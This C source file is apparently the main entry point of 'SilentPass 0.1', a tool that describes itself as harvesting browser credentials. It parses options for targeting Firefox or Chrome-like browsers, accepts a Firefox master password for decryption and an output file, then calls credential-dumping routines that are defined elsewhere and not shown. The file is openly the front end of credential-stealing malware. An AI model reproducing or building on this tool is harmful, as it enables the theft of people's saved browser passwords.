#include <stdio.h>
#include <stdlib.h>
#include <argp.h>

#include "main.h"
#include "firefox.h"
#include "chrome.h"

const char *argp_program_version = "SilentPass 0.1";
const char *argp_program_bug_address = "<silent@silent.com>";
static char doc[] = "A program to harvest browser credentials.";
static char args_doc[] = "";

static struct argp_option options[] = {
	{"verbose", 'v', 0, 0, "Produce verbose output",0},
	{"all", 'a', 0, 0, "Harvest all browsers credentials",0},	
	{"firefox", 'f', 0, 0, "Harvest Firefox credentials",0},	
	{"chrome", 'c', 0, 0, "Harvest Chrome-like credentials",0},	
	{"master-password", 'm', "PASSWORD", 0, "Master password to decrypt passwords (Firefox only for now)",1},	
	{"output", 'o', "FILE", 0, "Output file",1},	
	{0,0,0,0,0,0}
};



static error_t parse_opt(int key, char *arg, struct argp_state *state) {
	struct arguments *arguments = state->input;
	switch(key) {
		case 'v':
			arguments->verbose = 1;
			break;
		case 'a': 
			arguments->mode = ALL_MODE;
			break;
		case 'f':
			arguments->mode = FIREFOX_MODE;
			break;
		case 'c':
			arguments->mode = CHROME_MODE;
			break;
		case 'o':
			arguments->output_file = arg;
			break;
		case 'm':
			arguments->master_password = arg;
			break;
		case ARGP_KEY_ARG:
			if(state->arg_num > 3) {
				argp_usage(state);
			}
			break;
		default:
			return ARGP_ERR_UNKNOWN;
	}
	return 0;
};

static struct argp argp = {
	options,
	parse_opt,
	args_doc,
	doc,
	0,0,0
};

int main(int argc, char** argv) {
	struct arguments arguments;

	// Default value
	arguments.mode = ALL_MODE;
	arguments.verbose = 0;
	arguments.output_file = NULL;
	arguments.master_password = NULL;

	argp_parse(&argp, argc, argv, 0, 0, &arguments);

	if(arguments.mode == ALL_MODE) {
		puts("[*] All mode");
		if(dump_firefox(&arguments) == -1) {
			fprintf(stderr, "dump_firefox() failure\n");
		}
		if(dump_chrome(&arguments) == -1) {
			fprintf(stderr, "dump_chrome() failure\n");
		}
	}
	else if (arguments.mode == CHROME_MODE) {
		puts("[*] Chrome mode");
		if(dump_chrome(&arguments) == -1) {
			fprintf(stderr, "dump_chrome() failure\n");
		}

	}
	else if (arguments.mode == FIREFOX_MODE) {
		puts("[*] Firefox mode");
		if(dump_firefox(&arguments) == -1) {
			fprintf(stderr, "dump_firefox() failure\n");
		}
	}

	return 0;
}
